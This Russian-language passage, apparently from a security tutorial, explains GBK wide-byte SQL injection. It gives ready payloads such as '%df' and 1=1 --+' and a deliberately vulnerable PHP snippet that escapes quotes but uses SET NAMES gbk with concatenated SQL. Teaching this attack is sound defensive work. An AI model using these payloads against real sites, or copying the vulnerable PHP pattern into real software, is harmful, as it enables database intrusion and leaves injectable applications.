*   `%bf%5c`: Представляет байтовую последовательность `0xbf5c`. В GBK это декодируется как допустимый многобайтовый символ, за которым следует обратный слеш (`\`). Это может быть использовано для экранирования следующего символа в последовательности.
*   `%a1%27`: Представляет байтовую последовательность `0xa127`. В GBK это декодируется как допустимый многобайтовый символ, за которым следует одинарная кавычка (`'`).

**Можно создать множество payload'ов, таких как:**

```sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

**Вот пример на PHP с использованием кодировки GBK и фильтрацией пользовательского ввода для экранирования обратного слеша, одинарных и двойных кавычек.**

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

**Вот объяснение того, как работает wide byte injection:**

Например, если ввод `?id=1'`, PHP добавит обратный слеш, что приведёт к SQL-запросу: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.

Однако, когда перед одинарной кавычкой вводится последовательность `%df`, как в `?id=1%df'`, PHP всё равно добавляет обратный слеш. Это приводит к SQL-запросу: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.

В наборе символов GBK последовательность `%df%5c` переводится в символ `連`. Таким образом, SQL-запрос становится: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Здесь широкий байтовый символ `連` эффективно "съедает" добавленный экранирующий символ, позволяя выполнить SQL-инъекцию.

Следовательно, используя payload `?id=1%df' and 1=1 --+`, после добавления обратного слеша PHP, SQL-запрос преобразуется в: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. Этот изменённый запрос может быть успешно внедрён, обходя предполагаемую логику SQL.

## Ссылки
